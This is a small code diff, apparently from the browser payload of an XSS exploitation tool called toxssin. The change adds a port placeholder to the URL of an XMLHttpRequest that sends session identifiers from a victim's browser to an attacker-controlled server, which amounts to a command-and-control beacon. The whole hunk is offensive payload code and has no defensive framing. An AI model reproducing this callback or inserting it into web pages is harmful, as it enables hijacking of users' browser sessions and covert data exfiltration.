@@ -39,7 +39,7 @@ function uuid() {
 
 session_data = establish();
 tox_req = new XMLHttpRequest();
-tox_req.open("GET", `*TOXSSIN_SERVER*/c1cbfe271a40788a00e8bf8574d94d4b/${session_data[0]}/${session_data[1]}`, true);
+tox_req.open("GET", `*TOXSSIN_SERVER*:*TOXSSIN_PORT*/c1cbfe271a40788a00e8bf8574d94d4b/${session_data[0]}/${session_data[1]}`, true);
 
 tox_req.onreadystatechange = function() {
 	if (this.readyState == 4) {
